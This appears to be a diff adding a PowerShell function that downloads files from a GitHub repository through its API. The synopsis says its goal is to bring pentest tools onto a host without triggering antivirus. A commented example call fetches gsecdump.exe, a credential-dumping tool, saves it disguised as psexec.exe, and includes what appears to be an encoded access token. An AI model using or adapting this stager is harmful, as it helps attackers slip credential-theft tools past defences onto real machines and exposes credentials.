@@ -1,0 +1,93 @@
+function Invoke-GetContentFromGitHub
+{
+
+<#
+.SYNOPSIS
+Use this script to download files from GitHub
+
+The goal is to be able to download pentest tools to the localhost without 
+triggering antivirus
+
+
+#>
+
+
+    [CmdletBinding()] Param(
+
+    [Parameter(Position = 0, Mandatory = $True)]
+    [String]
+    $GHUser,
+
+
+    [Parameter(Position = 1, Mandatory = $True)]
+    [String]
+    $GHRepo,
+
+    [Parameter(Position = 2, Mandatory = $True)]
+    [String]
+    $GHPAT, # This should be base64 encoded
+
+    [Parameter(Position =3, Mandatory = $True)]
+    [String]
+    $GHFilePath,
+
+    [Parameter(Position = 4, Mandatory = $True)]
+    [String]
+    $GHFileName,
+
+    [Parameter(Position = 5, Mandatory=$True)]
+    [String]
+    $LocalFilePath
+
+
+    )
+
+
+
+    # Decode the GitHub Personal Access Token
+    $GHPAT = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($GHPAT))
+
+    # Get the PAT in the correct format
+    $Token = $GHUser + ":" + $GHPAT
+
+    # Convert this to Base64
+    $Base64Token = [System.Convert]::ToBase64String([char[]]$Token)
+    
+    $Headers = @{
+        Authorization =  'Basic {0}' -f $Base64Token;
+    };
+
+    # Construct the api of the file to download
+    $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath #+ $GHFileName
+
+    $Body = @{
+        path = $GHFilePath; # + $GHFileName;
+        ref = "master";
+    }
+
+
+    Try {
+        # Don't actually need the header
+        $content = Invoke-RestMethod -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
+         
+        #$sha = $content.sha
+        #write-host $content.content
+        #write-host $content.url
+        #write-host $content.git_url
+
+        $fileBytes = [System.Convert]::FromBase64String(($content.content))
+
+        $outFile = $LocalFilePath + $GHFileName
+
+        [System.IO.File]::WriteAllBytes($outFile, $fileBytes)
+        
+    }
+    Catch {        
+        $ErrorMessage = "Trying to get file contents: " + $_.Exception.Message;
+        Write-Error $ErrorMessage; 
+    }
+
+
+}
+
+#Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHPAT "zI5M2Q4ODM2MzBjMTRlNmJlZmE0YjA4ZmJmYjYyZjU2YmI1N2YwZA==" -GHFilePath "kali4/gsecdump.exe" -GHFileName "psexec.exe" -LocalFilePath "c:\temp\"
